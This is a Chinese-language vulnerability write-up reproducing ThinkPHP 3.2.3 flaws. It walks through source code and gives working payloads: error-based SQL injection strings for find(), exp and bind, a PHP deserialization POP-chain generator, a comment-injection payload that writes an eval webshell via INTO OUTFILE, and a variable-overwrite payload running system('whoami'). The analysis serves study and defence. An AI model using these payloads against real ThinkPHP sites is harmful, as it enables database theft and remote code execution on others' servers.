> 原文链接: https://www.anquanke.com//post/id/250537 


# ThinkPHP 3.2.3 漏洞复现


                                阅读量   
                                **15464**
                            
                        |
                        
                                                                                    



[![](https://p1.ssl.qhimg.com/t012b360d7e52c07268.jpg)](https://p1.ssl.qhimg.com/t012b360d7e52c07268.jpg)



## 0x00 $this-&gt;show 造成命令执行

在 `Home\Controller\IndexController` 下的index中传入了一个可控参数，跟进调试看一下。

```
class IndexController extends Controller
`{`
    public function index($n='')
    `{`
        $this-&gt;show('&lt;style type="text/css"&gt;*`{` padding: 0; margin: 0; `}` div`{` padding: 4px 48px;`}` body`{` background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px`}` h1`{` font-size: 100px; font-weight: normal; margin-bottom: 12px; `}` p`{` line-height: 1.8em; font-size: 36px `}` a,a:hover`{`color:blue;`}`&lt;/style&gt;&lt;div style="padding: 24px 48px;"&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt;欢迎使用 &lt;b&gt;ThinkPHP&lt;/b&gt;！&lt;/p&gt;&lt;br/&gt;版本 V`{`$Think.version`}`&lt;/div&gt;&lt;script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"&gt;&lt;/script&gt;&lt;thinkad id="ad_55e75dfae343f5a1"&gt;&lt;/thinkad&gt;&lt;script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"&gt;&lt;/script&gt;&lt;/p&gt;Hello '.$n, 'utf-8');
    `}`
`}`
```

跟进 `display()`

```
protected function show($content,$charset='',$contentType='',$prefix='') `{`
    $this-&gt;view-&gt;display('',$charset,$contentType,$content,$prefix);
`}`
```

一路跟进到 `fetch()`，然后一路进入 `Hook::listen('view_parse', $params);`

```
public function fetch($templateFile='', $content='', $prefix='')
`{`
    if (empty($content)) `{`
        $templateFile   =   $this-&gt;parseTemplate($templateFile);
        // 模板文件不存在直接返回
        if (!is_file($templateFile)) `{`
            E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
        `}`
    `}` else `{`
        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
    `}`
    // 页面缓存
    ob_start();
    ob_implicit_flush(0);
    if ('php' == strtolower(C('TMPL_ENGINE_TYPE'))) `{` // 使用PHP原生模板
        $_content   =   $content;
        // 模板阵列变量分解成为独立变量
        extract($this-&gt;tVar, EXTR_OVERWRITE);
        // 直接载入PHP模板
        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
    `}` else `{`
        // 视图解析标签
        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
        Hook::listen('view_parse', $params);
    `}`
    // 获取并清空缓存
    $content = ob_get_clean();
    // 内容过滤标签
    Hook::listen('view_filter', $content);
    // 输出模板文件
    return $content;
`}`
```

关键地方在这，我们之前 `index` 里的内容被存入了缓存文件php文件中，连带着我们输入的可控的php代码也在其中，然后包含了该文件，所以造成了命令执行。

```
public function load($_filename,$vars=null)`{`
    if(!is_null($vars))`{`
        extract($vars, EXTR_OVERWRITE);
    `}`
    include $_filename;
`}`
```



## 0x01 sql注入

`/Application/Home/Controller/IndexController.class.php` 添加一段SQL查询代码。`http://localhost/tp323/index.php/Home/Index/sql?id=1` 查询入口。

```
public function sql()
`{`
    $id = I('GET.id');
    $user = M('user');
    $data = $user-&gt;find($id);
    var_dump($data);
`}`
```

传入 `id=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--+` ，跟进调试。进入 `find()` 函数，先进行一段判断，传入的参数是否是数字或者字符串，满足条件的话 `$options['where']['id']=input`。

```
if(is_numeric($options) || is_string($options)) `{`
    $where[$this-&gt;getPk()]  =   $options;
    $options                =   array();
    $options['where']       =   $where;
`}`
```

随后进行一个判断 `if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk))`，`getPk()`函数是查找mysql主键的函数，显然 `$pk` 值是 `id`，不满足条件

```
$pk  =  $this-&gt;getPk(); // $pk='id'
if (is_array($options) &amp;&amp; (count($options) &gt; 0) &amp;&amp; is_array($pk)) `{`
    //
`}`
```

随后执行 `$options = $this-&gt;_parseOptions($options);` ，

```
protected function _parseOptions($options=array())
`{`
    if (is_array($options)) `{`
        $options =  array_merge($this-&gt;options, $options);
    `}`

    if (!isset($options['table'])) `{`
        // 自动获取表名
        $options['table']   =   $this-&gt;getTableName();
        $fields             =   $this-&gt;fields;
    `}` else `{`
        // 指定数据表 则重新获取字段列表 但不支持类型检测
        $fields             =   $this-&gt;getDbFields();
    `}`

    // 数据表别名
    if (!empty($options['alias'])) `{`
        $options['table']  .=   ' '.$options['alias'];
    `}`
    // 记录操作的模型名称
    $options['model']       =   $this-&gt;name;

    // 字段类型验证
    if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) `{`
        // 对数组查询条件进行字段类型检查
        foreach ($options['where'] as $key=&gt;$val) `{`
            $key            =   trim($key);
            if (in_array($key, $fields, true)) `{`
                if (is_scalar($val)) `{`
                    $this-&gt;_parseType($options['where'], $key);
                `}`
            `}` elseif (!is_numeric($key) &amp;&amp; '_' != substr($key, 0, 1) &amp;&amp; false === strpos($key, '.') &amp;&amp; false === strpos($key, '(') &amp;&amp; false === strpos($key, '|') &amp;&amp; false === strpos($key, '&amp;')) `{`
                if (!empty($this-&gt;options['strict'])) `{`
                    E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']');
                `}`
                unset($options['where'][$key]);
            `}`
        `}`
    `}`
    // 查询过后清空sql表达式组装 避免影响下次查询
    $this-&gt;options  =   array();
    // 表达式过滤
    $this-&gt;_options_filter($options);
    return $options;
`}`
```

先获取查询的表的字段和字段类型。

```
if (!isset($options['table'])) `{`
    // 自动获取表名
    $options['table']   =   $this-&gt;getTableName();
    $fields             =   $this-&gt;fields;
`}`
```

关键代码在于下面这个判断里，进入 `$this-&gt;_parseType($options['where'], $key)` 。

```
if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join'])) `{`
    // 对数组查询条件进行字段类型检查
    foreach ($options['where'] as $key=&gt;$val) `{`
        $key            =   trim($key);
        if (in_array($key, $fields, true)) `{`
            if (is_scalar($val)) `{`
                $this-&gt;_parseType($options['where'], $key);
            `}`
        `}` elseif (!is_numeric($key) &amp;&amp; '_' != substr($key, 0, 1) &amp;&amp; false === strpos($key, '.') &amp;&amp; false === strpos($key, '(') &amp;&amp; false === strpos($key, '|') &amp;&amp; false === strpos($key, '&amp;')) `{`
            if (!empty($this-&gt;options['strict'])) `{`
                E(L('_ERROR_QUERY_EXPRESS_').':['.$key.'=&gt;'.$val.']');
            `}`
            unset($options['where'][$key]);
        `}`
    `}`
`}`
```

这里由于id字段的类型是 `int` ，所以进入第二个分支，将我们的输入转化为十进制，恶意语句就被过滤了，后面就是正常的SQL语句了。

```
protected function _parseType(&amp;$data,$key) `{`
    if(!isset($this-&gt;options['bind'][':'.$key]) &amp;&amp; isset($this-&gt;fields['_type'][$key]))`{`
        $fieldType = strtolower($this-&gt;fields['_type'][$key]);
        if(false !== strpos($fieldType,'enum'))`{`
            // 支持ENUM类型优先检测
        `}`elseif(false === strpos($fieldType,'bigint') &amp;&amp; false !== strpos($fieldType,'int')) `{`
            $data[$key]   =  intval($data[$key]);
        `}`elseif(false !== strpos($fieldType,'float') || false !== strpos($fieldType,'double'))`{`
            $data[$key]   =  floatval($data[$key]);
        `}`elseif(false !== strpos($fieldType,'bool'))`{`
            $data[$key]   =  (bool)$data[$key];
        `}`
    `}`
`}`
```

如果我们传参是传入一个数组 `id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1)--+` ，在`find()` 函数的第一个判断就没有满足条件不会进入这个判断，此时 `$options` 就是 `$options[where]='1 and updatexml(1,concat(0x7e,user(),0x7e),1)-- '`，而没有上面的键 `id`。

```
if(is_numeric($options) || is_string($options)) `{`
    $where[$this-&gt;getPk()]  =   $options;
    $options                =   array();
    $options['where']       =   $where;
`}`
```

然后到下面的关键代码的判断 `if (isset($options['where']) &amp;&amp; is_array($options['where']) &amp;&amp; !empty($fields) &amp;&amp; !isset($options['join']))` ，`is_array($options['where'])` 显然是false，因为此时 `$options['where']` 是一个字符串而不是数组，所以不会进入下面的判断，也就是说不会进入函数 `_parseType()` 对我们的输入进行过滤。

之后回到 `find()` 函数中进入 `$resultSet = $this-&gt;db-&gt;select($options);`，此时的 `$options` 就是我们输入的恶意SQL语句，显然注入成功。



## 0x02 反序列化 &amp; sql注入

`/Application/Home/Controller/IndexController.class.php` 添加一段代码。`http://localhost/tp323/index.php/Home/Index/sql?data=` 查询入口。

```
public function sql()
`{`
    unserialize(base64_decode($_POST['data']));
`}`
```

全局搜索 `function __destruct`，找一个起点。

在文件：`/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php` 中找到了 `Imagick` 类的 `__destruct` 方法。

```
public function __destruct() `{`
    empty($this-&gt;img) || $this-&gt;img-&gt;destroy();
`}`
```

这里 `$this-&gt;img` 是可控的，所以我们接着找一下 `destroy()` 函数。共有三个，选择了 `ThinkPHP/Library/Think/Session/Driver/Memcache.class.php` 中的 `Memcache` 类的 `destroy` 函数。这里有个坑，由于上面调用 `destroy()` 函数时没有参数传入，而我们找到的是有参数的，PHP7下起的ThinkPHP在调用有参函数却没有传入参数的情况下会报错，所以我们要选用PHP5而不选用PHP7.

```
public function destroy($sessID) `{`
    return $this-&gt;handle-&gt;delete($this-&gt;sessionName.$sessID);
`}`
```

这里`handle` 可控，那么就接着找 `delete` 函数。在 `ThinkPHP/Mode/Lite/Model.class.php` 的 `Model` 类中找到了合适的函数，当然选用 `/ThinkPHP/Library/Think/Model.class.php` 中的该函数也是可以的。我们的目的就是进入 `$this-&gt;delete($this-&gt;data[$pk])`。所以这里只截取了前面部分的代码。

```
public function delete($options=array()) `{`
    $pk   =  $this-&gt;getPk();
    if(empty($options) &amp;&amp; empty($this-&gt;options['where'])) `{`
        // 如果删除条件为空 则删除当前数据对象所对应的记录
        if(!empty($this-&gt;data) &amp;&amp; isset($this-&gt;data[$pk]))
            return $this-&gt;delete($this-&gt;data[$pk]);
        else
            return false;
    `}`
`}`
```

我们想要调用这个if中的 `delete` ，就要使得我们传入的 `$options` 为空，且 `$this-&gt;options['where']` 为空，是可控的，所以走到第二个if，`$this-&gt;data` 不为空，且 `$this-&gt;data[$pk]` 存在，满足条件就可以调用 `delete($this-&gt;data[$pk])` 了。而 `$pk` 就是 `$this-&gt;pk` ，都是可控的。

之前因为 `destroy()` 调用时没有参数，使得调用 `delete` 函数参数部分可控，而现在我们正常带着参数进入了 `delete` 函数，就可以接着往下走了。直到运行至 `$result  =    $this-&gt;db-&gt;delete($options);`，调用了ThinkPHP数据库模型类中的 `delete()` 方法。

这里的 `$table` 是取自传入的参数，可控，直接拼接到 `$sql` 中，然后传入了 `$this-&gt;execute`。

```
public function delete($options=array()) `{`
    $this-&gt;model  =   $options['model'];
    $this-&gt;parseBind(!empty($options['bind'])?$options['bind']:array());
    $table  =   $this-&gt;parseTable($options['table']);
    $sql    =   'DELETE FROM '.$table;
    if(strpos($table,','))`{`// 多表删除支持USING和JOIN操作
        if(!empty($options['using']))`{`
            $sql .= ' USING '.$this-&gt;parseTable($options['using']).' ';
        `}`
        $sql .= $this-&gt;parseJoin(!empty($options['join'])?$options['join']:'');
    `}`
    $sql .= $this-&gt;parseWhere(!empty($options['where'])?$options['where']:'');
    if(!strpos($table,','))`{`
        // 单表删除支持order和limit
        $sql .= $this-&gt;parseOrder(!empty($options['order'])?$options['order']:'')
            .$this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:'');
    `}`
    $sql .=   $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:'');
    return $this-&gt;execute($sql,!empty($options['fetch_sql']) ? true : false);
`}`
```

接着调用 `$this-&gt;initConnect(true);`，随后是 `$this-&gt;connect()` ，这里是用 `$this-&gt;config` 来初始化数据库的，然后去执行先前拼接好的SQL语句。

```
&lt;?php
public function connect($config='',$linkNum=0,$autoConnection=false) `{`
    if ( !isset($this-&gt;linkID[$linkNum]) ) `{`
        if(empty($config))  $config =   $this-&gt;config;
        try`{`
            if(empty($config['dsn'])) `{`
                $config['dsn']  =   $this-&gt;parseDsn($config);
            `}`
            if(version_compare(PHP_VERSION,'5.3.6','&lt;='))`{` 
                // 禁用模拟预处理语句
                $this-&gt;options[PDO::ATTR_EMULATE_PREPARES]  =   false;
            `}`
            $this-&gt;linkID[$linkNum] = new PDO( $config['dsn'], $config['username'], $config['password'],$this-&gt;options);
        `}`catch (\PDOException $e) `{`
            if($autoConnection)`{`
                trace($e-&gt;getMessage(),'','ERR');
                return $this-&gt;connect($autoConnection,$linkNum);
            `}`elseif($config['debug'])`{`
                E($e-&gt;getMessage());
            `}`
        `}`
    `}`
    return $this-&gt;linkID[$linkNum];
`}`
```

所以POP链就出来了：

```
&lt;?php

namespace Think\Image\Driver`{`
    use Think\Session\Driver\Memcache;

    class Imagick
    `{`
        private $img;

        public function __construct()
        `{`
            $this-&gt;img = new Memcache();
        `}`
    `}`
`}`

namespace Think\Session\Driver`{`
    use  Think\Model;

    class Memcache
    `{`
        protected $handle;
        public function __construct()
        `{`
            $this-&gt;handle = new Model();
        `}`
    `}`
`}`

namespace Think`{`
    use Think\Db\Driver\Mysql;

    class Model
    `{`
        protected $options;
        protected $data;
        protected $pk;
        protected $db;

        public function __construct()
        `{`
            $this-&gt;db = new Mysql();
            $this-&gt;options['where'] = '';
            $this-&gt;data['id'] = array(
                "table" =&gt; "mysql.user where 1=updatexml(1,user(),1)#",
                "where" =&gt; "1=1"
            );
            $this-&gt;pk = 'id';
        `}`
    `}`
`}`

namespace Think\Db\Driver`{`
    use PDO;

    class Mysql
    `{`
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true
        );
        protected $config = array(
            "debug"    =&gt; 1,
            "database" =&gt; "test",
            "hostname" =&gt; "127.0.0.1",
            "hostport" =&gt; "3306",
            "charset"  =&gt; "utf8",
            "username" =&gt; "root",
            "password" =&gt; "root"
        );
    `}`
`}`

namespace `{`
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
`}`
```



## 0x03 注释注入

触发注释注入的调用为：`$user = M('user')-&gt;comment($id)-&gt;find(intval($id));`。

调试跟进一下，调用的是 `Think\Model.class.php` 中的 `comment`

```
/**
 * 查询注释
 * @access public
 * @param string $comment 注释
 * @return Model
 */
public function comment($comment)
`{`
    $this-&gt;options['comment'] =   $comment;
    return $this;
`}`
```

之后调用 `Think\Model` 的find方法。一直到调用了 `Think\Db\Driver.class.php` 中的 `parseComment` 函数，将我们输入的内容拼接在了注释中，于是我们可以将注释符闭合，然后插入SQL语句。此时的SQL语句为 `"SELECT * FROM`user`WHERE`id`= 1 LIMIT 1   /* 1 */"`

```
protected function parseComment($comment) `{`
    return  !empty($comment)?   ' /* '.$comment.' */':'';
`}`
```

如果这里没有 `LIMIT 1` 的话我们可以直接进行union注入，但是这里有 `LIMIT 1` ，进行union注入会提示 `Incorrect usage of UNION and LIMIT`，只有同时把union前的SQL查询语句用括号包起来才可以进行查询，但是显然我们无法做到，那么我们可以利用 `into outfile` 的拓展来进行写文件。

```
"OPTION"参数为可选参数选项，其可能的取值有：
`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。
`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。
`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。
`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。
`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。
`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。
```

`?id=1*/ into outfile "path/1.php" LINES STARTING BY '&lt;?php eval($_POST[1]);?&gt;'/*` 就可以进行写马了。



## 0x04 exp注入

触发exp注入的查询语句如下。

```
public function sql()
`{`
    $User = D('user');
    var_dump($_GET['id']);
    $map = array('id' =&gt; $_GET['id']);
    // $map = array('id' =&gt; I('id'));
    $user = $User-&gt;where($map)-&gt;find();
    var_dump($user);
`}`
```

这里一路跟进到 `parseSql()` 函数，然后调用到 `parseWhere()` 。

```
public function parseSql($sql,$options=array())`{`
    $sql   = str_replace(
        array('%TABLE%','%DISTINCT%','%FIELD%','%JOIN%','%WHERE%','%GROUP%','%HAVING%','%ORDER%','%LIMIT%','%UNION%','%LOCK%','%COMMENT%','%FORCE%'),
        array(
            $this-&gt;parseTable($options['table']),
            $this-&gt;parseDistinct(isset($options['distinct'])?$options['distinct']:false),
            $this-&gt;parseField(!empty($options['field'])?$options['field']:'*'),
            $this-&gt;parseJoin(!empty($options['join'])?$options['join']:''),
            $this-&gt;parseWhere(!empty($options['where'])?$options['where']:''),
            $this-&gt;parseGroup(!empty($options['group'])?$options['group']:''),
            $this-&gt;parseHaving(!empty($options['having'])?$options['having']:''),
            $this-&gt;parseOrder(!empty($options['order'])?$options['order']:''),
            $this-&gt;parseLimit(!empty($options['limit'])?$options['limit']:''),
            $this-&gt;parseUnion(!empty($options['union'])?$options['union']:''),
            $this-&gt;parseLock(isset($options['lock'])?$options['lock']:false),
            $this-&gt;parseComment(!empty($options['comment'])?$options['comment']:''),
            $this-&gt;parseForce(!empty($options['force'])?$options['force']:'')
        ),$sql);
    return $sql;
`}`
```

`parseWhere()` 调用了 `parseWhereItem()` ，截取了部分关键代码，这里的 `$val` 就是我们传入的参数，所以当我们传入数组时，`$exp` 就是数组的第一个值，如果等于exp，就会使用.直接将数组的第二个值拼接上去，就会造成SQL注入。

```
$exp = strtolower($val[0]);
......
elseif('bind' == $exp )`{` // 使用表达式
    $whereStr .= $key.' = :'.$val[1];
`}`elseif('exp' == $exp )`{` // 使用表达式
    $whereStr .= $key.' '.$val[1];
`}`
```

也就是说当我们传入 `?id[0]=exp&amp;id[1]== 1 and updatexml(1,concat(0x7e,user(),0x7e),1)` 时，拼接后的字符串就是 `"`id` = 1 and updatexml(1,concat(0x7e,user(),0x7e),1)"`，最后的SQL语句也就成了 `"SELECT * FROM `user` WHERE `id` =1 and updatexml(1,concat(0x7e,user(),0x7e),1) LIMIT 1  "`，可以进行报错注入了。

这里使用了全局数组 `$_GET` 来传参，而不是tp自带的 `I()` 函数，是因为在 `I()` 函数的最后有这么一句代码，

```
is_array($data) &amp;&amp; array_walk_recursive($data,'think_filter');
```

调用了 `think_filter()` 函数来进行过滤，刚好就过滤了 `EXP` ，在后面加上了一个空格，那么自然也就无法进行上面的流程，不能进行注入了。

```
function think_filter(&amp;$value)`{`
    // TODO 其他安全过滤

    // 过滤查询特殊字符
    if(preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i',$value))`{`
        $value .= ' ';
    `}`
`}`
```



## 0x05 bind注入

```
public function sql()
`{`
    $User = M("user");
    $user['id'] = I('id');
    $data['password'] = I('password');
    $valu = $User-&gt;where($user)-&gt;save($data);
    var_dump($valu);
`}`
```

payload:`?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1`

这里一路执行到上面的 `parseWhereItem()` 处，除了exp外，还有一处bind，这里同样也是用点拼接字符串，但是不同的是这里还拼接了一个冒号。也就是说拼接之后是 `"`id` = :0 and updatexml(1,concat(0x7e,user(),0x7e),1)"` 这样的。

```
$exp = strtolower($val[0]);
......
elseif('bind' == $exp )`{` // 使用表达式
    $whereStr .= $key.' = :'.$val[1];
`}`elseif('exp' == $exp )`{` // 使用表达式
    $whereStr .= $key.' '.$val[1];
`}`
```

拼接到SQL语句后是 `"UPDATE `user` SET `password`=:0 WHERE `id` = :0 and updatexml(1,concat(0x7e,user(),0x7e),1)"`。

随后在 `update()` 中调用了 `execute()` 函数，执行了如下代码

```
if(!empty($this-&gt;bind))`{`
    $that   =   $this;
    $this-&gt;queryStr =   strtr($this-&gt;queryStr,array_map(function($val) use($that)`{` return '\''.$that-&gt;escapeString($val).'\''; `}`,$this-&gt;bind));
`}`
```

这里就将 `:0` 替换为了我们传入的password的值，SQL语句也就变为了 `"UPDATE `user` SET `password`='1' WHERE `id` = '1' and updatexml(1,concat(0x7e,user(),0x7e),1)"`，所以我们在传参的时候 `id[1]` 最开始的字符传入的是0，才能去除掉冒号。最后SQL注入成功。



## 0x06 变量覆盖导致命令执行

触发rce的代码如下。

```
public function test($name='', $from='ctfshow')
`{`
    $this-&gt;assign($name, $from);
    $this-&gt;display('index');
`}`
```

先调用 `assign()` 函数。

```
public function assign($name, $value='')
`{`
    if (is_array($name)) `{`
        $this-&gt;tVar   =  array_merge($this-&gt;tVar, $name);
    `}` else `{`
        $this-&gt;tVar[$name] = $value;
    `}`
`}`
```

当我们传入 `?name=_content&amp;from=&lt;?php system("whoami")?&gt;` 时经过 `assign()` 函数后就有：`$this-&gt;view-&gt;tVar["_content"]="&lt;?php system("whoami")?&gt;"`

`display()` 函数跟进，`$content` 获取模板内容。

```
public function display($templateFile='', $charset='', $contentType='', $content='', $prefix='')
`{`
    G('viewStartTime');
    // 视图开始标签
    Hook::listen('view_begin', $templateFile);
    // 解析并获取模板内容
    $content = $this-&gt;fetch($templateFile, $content, $prefix);
    // 输出模板内容
    $this-&gt;render($content, $charset, $contentType);
    // 视图结束标签
    Hook::listen('view_end');
`}`
```

这里调用了 `fetch()` 函数，有一个if判断，如果使用了PHP原生模板就进入这个判断，这个就对应的是 `ThinkPHP\Conf\convention.php` 中的 `'TMPL_ENGINE_TYPE'      =&gt;  'php',`。

```
public function fetch($templateFile='', $content='', $prefix='')
`{`
    if (empty($content)) `{`
        $templateFile   =   $this-&gt;parseTemplate($templateFile);
        // 模板文件不存在直接返回
        if (!is_file($templateFile)) `{`
            E(L('_TEMPLATE_NOT_EXIST_').':'.$templateFile);
        `}`
    `}` else `{`
        defined('THEME_PATH') or    define('THEME_PATH', $this-&gt;getThemePath());
    `}`
    // 页面缓存
    ob_start();
    ob_implicit_flush(0);
    if ('php' == strtolower(C('TMPL_ENGINE_TYPE'))) `{` // 使用PHP原生模板
        $_content   =   $content;
        // 模板阵列变量分解成为独立变量
        extract($this-&gt;tVar, EXTR_OVERWRITE);
        // 直接载入PHP模板
        empty($_content)?include $templateFile:eval('?&gt;'.$_content);
    `}` else `{`
        // 视图解析标签
        $params = array('var'=&gt;$this-&gt;tVar,'file'=&gt;$templateFile,'content'=&gt;$content,'prefix'=&gt;$prefix);
        Hook::listen('view_parse', $params);
    `}`
    // 获取并清空缓存
    $content = ob_get_clean();
    // 内容过滤标签
    Hook::listen('view_filter', $content);
    // 输出模板文件
    return $content;
`}`
```

这里进入判断后，执行了 `extract($this-&gt;tVar, EXTR_OVERWRITE);` ，而通过前面的分析得知我们已有 `$this-&gt;view-&gt;tVar["_content"]="&lt;?php system("whoami")?&gt;"` ，因此这里就存在变量覆盖，将 `$_content` 覆盖为了我们输入的要执行的命令。

随后执行 `empty($_content)?include $templateFile:eval('?&gt;'.$_content);` ，此时的 `$_content` 显然不为空，所以会执行 `eval('?&gt;'.$_content);` ，也就造成了命令执行。



## 参考文献

[thinkphp3.2.3 sql注入分析](https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/)<br>[ThinkPHP v3.2.* （SQL注入&amp;文件读取）反序列化POP链](https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt)<br>[ Ctfshow web入门 thinkphp专题](https://blog.csdn.net/rfrder/article/details/116095677)<br>[ thinkphp3.2.3 SQL注入漏洞复现](https://blog.csdn.net/rfrder/article/details/114024426)<br>[Thinkphp3 漏洞总结](https://y4er.com/post/thinkphp3-vuln/)
